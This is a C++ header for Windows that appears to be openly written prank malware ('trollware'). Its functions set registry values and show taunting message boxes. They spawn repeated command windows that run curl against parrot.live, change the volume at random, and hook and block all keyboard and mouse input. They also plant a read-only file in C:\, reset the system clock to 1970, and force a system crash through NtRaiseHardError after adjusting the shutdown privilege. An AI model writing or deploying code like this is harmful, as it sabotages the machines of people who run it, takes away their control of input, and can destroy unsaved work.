#pragma once

#include<windows.h>
#include<unistd.h>
#include<mmdeviceapi.h>
#include<endpointvolume.h>
#include<audioclient.h>
#include<winternl.h>

#include<iostream>
#include<fstream>
#include<vector>
#include<thread>
#include<chrono>
#include<string>

using std::cerr;
using namespace std::chrono_literals;

extern "C" NTSTATUS NTAPI NtRaiseHardError(
	NTSTATUS ErrorStatus,
	ULONG NumberOfParameters,
	ULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters,
	ULONG ValidResponseOptions,
	PULONG Response
);

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(
	ULONG Privilege,
	BOOLEAN Enable,
	BOOLEAN CurrentThread,
	PBOOLEAN Enabled
);


const ULONG SE_SHUTDOWN_PRIVILEGE = 19;
const ULONG OPTION_SHUTDOWN_SYSTEM = 6;

HHOOK kh;
HHOOK mh;

void reg_set_key(HKEY father_key, std::string son_key, std::string value_name, std::string value_data){
    HKEY keyptr;

    const BYTE* data=(BYTE*)value_data.c_str();

    if(RegOpenKeyA(father_key, son_key.c_str(), &keyptr)==ERROR_SUCCESS){
        /*RegGetValueA(keyptr, NULL, value_name.c_str(), RRF_RT_REG_SZ, NULL, data, &sdata);
        cerr<<data<<"\n";*/
        
        if(RegSetValueExA(keyptr, value_name.c_str(), 0, REG_SZ, data, value_data.length()+1)!=ERROR_SUCCESS){
            cerr<< "Failed to set registry value.\n";
        }
        RegCloseKey(keyptr);
    }else{
        cerr<<"Failed to open or create registry key.\n";
    }
}

void display_windows(){
    std::string title_1="DANGER!";
    std::string text_1="I don't suggest closing this...";
    std::string title_2="WHAT?";
    std::string text_2="What did I just tell you?";
    std::string title_3="AGAIN?!";
    std::string text_3="Ok, pay attention now...";

    MessageBoxA(NULL, text_1.c_str(), title_1.c_str(), MB_OK | MB_ICONEXCLAMATION);
    MessageBoxA(NULL, text_2.c_str(), title_2.c_str(), MB_OK | MB_ICONEXCLAMATION);
    MessageBoxA(NULL, text_3.c_str(), title_3.c_str(), MB_OK | MB_ICONEXCLAMATION);
}

void spam_cmd(){
    ShellExecuteA(NULL, "open", "start", NULL, NULL, SW_NORMAL);
    ShellExecuteA(NULL, "open", "curl", "parrot.live", NULL, SW_NORMAL);
    ShellExecuteA(NULL, "open", "start", NULL, NULL, SW_NORMAL);
    ShellExecuteA(NULL, "open", "curl", "parrot.live", NULL, SW_NORMAL);
    ShellExecuteA(NULL, "open", "start", NULL, NULL, SW_NORMAL);
    ShellExecuteA(NULL, "open", "curl", "parrot.live", NULL, SW_NORMAL);
    ShellExecuteA(NULL, "open", "start", NULL, NULL, SW_NORMAL);
    ShellExecuteA(NULL, "open", "curl", "parrot.live", NULL, SW_NORMAL);

    ShellExecuteA(NULL, "open", "https://cdn-img-q.facciabuco.com/294/lrcgpjpeju-claudio-bivio-vaccata_a.jpg", NULL, NULL, SW_SHOWNORMAL);
}

void set_vol(float level){
    HRESULT hr;
    IMMDeviceEnumerator *p_enum=NULL;
    IMMDevice *p_dev=NULL;
    IAudioEndpointVolume *p_endpt_vol=NULL;

    hr=CoInitialize(NULL);
    if(FAILED(hr)){
        cerr<<"Failed to initialize COM library.";
        return;
    }

    hr=CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator),(void**)&p_enum);
    if(FAILED(hr)){
        cerr<<"Failed to create device enumerator.";
        CoUninitialize();
        return;
    }

    hr=p_enum->GetDefaultAudioEndpoint(eRender, eConsole, &p_dev);
    if(FAILED(hr)){
        cerr<<"Failed to get default audio endpoint.";
        p_enum->Release();
        CoUninitialize();
        return;
    }

    hr=p_dev->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL,(void**)&p_endpt_vol);
    if(FAILED(hr)){
        cerr<<"Failed to get endpoint volume interface.";
        p_dev->Release();
        p_enum->Release();
        CoUninitialize();
        return;
    }

    hr=p_endpt_vol->SetMasterVolumeLevelScalar(level, NULL);
    if(FAILED(hr)){
        cerr<<"Failed to set volume level.";
    }

    p_endpt_vol->Release();
    p_dev->Release();
    p_enum->Release();
    CoUninitialize();
}

void spam_volume(){
    for(int i=0; i<30; i++){
        set_vol((float)(rand()%101)/100);
        std::this_thread::sleep_for(500ms);
    }
}

LRESULT CALLBACK ll_keyproc(int n_code, WPARAM w_param, LPARAM l_param) {
    // Block all keyboard input
    return (n_code==HC_ACTION) ? 1 : CallNextHookEx(kh, n_code, w_param, l_param);
}

LRESULT CALLBACK ll_mouseproc(int n_code, WPARAM w_param, LPARAM l_param) {
    // Block all mouse input
    return (n_code==HC_ACTION) ? 1 : CallNextHookEx(mh, n_code, w_param, l_param);
}

void block_inputs(){
    kh=SetWindowsHookEx(WH_KEYBOARD_LL, ll_keyproc, NULL, 0);
    mh=SetWindowsHookEx(WH_MOUSE_LL, ll_mouseproc, NULL, 0);

    std::this_thread::sleep_for(5000ms);

    UnhookWindowsHookEx(kh);
    UnhookWindowsHookEx(mh);
}

std::string random_string(){
    std::string tmp;
    int len=rand()%10+5;

    for(int i=0; i<len; i++){
        tmp+=(char)(rand()%('a'-'A'+1)+'A');
    }

    return tmp;
}

void special_file_make(){
    HANDLE f_h;

    SECURITY_ATTRIBUTES s_a;

    f_h=CreateFileA("C:\\wassup.dll", 0, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_READONLY, NULL);
    CloseHandle(f_h);
}

void set_time(){
    SYSTEMTIME st;
    st.wDay=1;
    st.wMonth=1;
    st.wYear=1970;

    st.wMinute=1;
    st.wHour=1;

    SetSystemTime(&st);
}

void crash_system(){
    std::this_thread::sleep_for(5s);

    BOOLEAN enabled;
    ULONG response;
    RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, true, false, &enabled);
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0,0,NULL, OPTION_SHUTDOWN_SYSTEM, &response);
}